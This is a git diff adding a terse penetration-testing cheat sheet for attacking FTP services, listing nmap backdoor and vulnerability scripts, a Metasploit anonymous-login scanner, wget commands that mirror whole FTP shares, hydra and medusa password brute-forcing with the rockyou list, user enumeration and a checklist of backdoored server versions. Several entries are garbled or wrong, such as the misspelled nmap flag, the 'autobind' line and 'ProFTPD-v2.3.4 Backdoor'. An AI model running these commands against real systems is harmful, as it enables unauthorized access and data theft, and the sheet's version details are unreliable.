@@ -1,0 +1,80 @@
+# all ports enumerations # 
+
+# ftp : - 
+
+nmap -script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve20 x.x.x.x
+nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 x.x.x.x
+
+# VUNLERABILITY SCANNING : - 
+
+nmap --script=ftp* -p 21 x.x.x.x
+nmap --scirpt=ftp-* -p 21 x.x.x.x -Pn 
+
+# ANONYMOUS CHECK WITH METASPLOIT : - 
+user auxilary/scanner/ftp/anonymous
+
+# DOWNLOAD ALL FILES FROM FTP 
+wget -m ftp://anonymous:anonymous@x.x.x.x
+wget -m --no-passive ftp://anonymous:anonymous@x.x.x.x
+wget -r ftp://anonymous:anonymous@x.x.x.x/share/*
+
+# AUTO BIND FTP WHEN FTP WHEN FTP IS PERMISSION DENIED FOR LOCAL USER 
+ autobind <ftp command> {autobind allow specific user to bid tcp usp partbelow x.x.x.x
+  
+# REMEMBER WHILE UPLOADING FILES ON FTP 
+      # when putting binary : -  binary  { to enable binary mode }
+  
+# BRUTEFORCE PASSWORDS KNOWN USERS 
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://x.x.x.x
+   hydra -l admin -P /usr/share/wordlists/rockyou.txt -f ftp x.x.x.x -v 
+   medusa -h x.x.x.x -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
+   nmap -P 21 -script ftp-brute.nse -script-args userdb=/usr/share/wordlists/rockyou.txt,passdb=/usr/share/wordlists/rockyou.txt x.x.x.x
+  
+ # ENUMERATION OF USERS : - 
+   ftp-user-enum.pl -U users.txt -t x.x.x.x
+   ftp-user-enum.pl -M iu -u users.txt -t x.x.x.x
+ 
+ # COMMANDS : - 
+    send : - send files
+    put  : - send one file
+    mput : - send multiple files 
+    mget : - get multiple files 
+    get  : - get file from the remote server
+    mget* : - download everything
+  
+    binary : switch to binary transfer mode 
+    ascii  : switch to ascii transfer mode 
+  
+ # CONFIGURATIONS FILES : - 
+    ftpusers
+    ftp.conf
+    proftpd.conf
+  
+ # VULNERABILITY VERSIONS : - 
+    ProFTPD-1.3.3c Backdoor
+    ProFTPD-13.5 MoD_COPY   -  command execution 
+    ProFTPD-v2.3.4 Backdoor - command execution
+ 
+ # EXPLOITATIONS : - 
+    gather version numbers
+    searchsploit 
+    default creds
+    creds previously gatherd
+    download the software
+  
+ # FINALY : -   
+    ftp x.x.x.x
+    ls 
+    cd share
+    ls
+    prompt off
+    recurse on 
+    get test.txt
+    mget*
+    
+  
+  
+  
+# SSH 22 
+  
+  
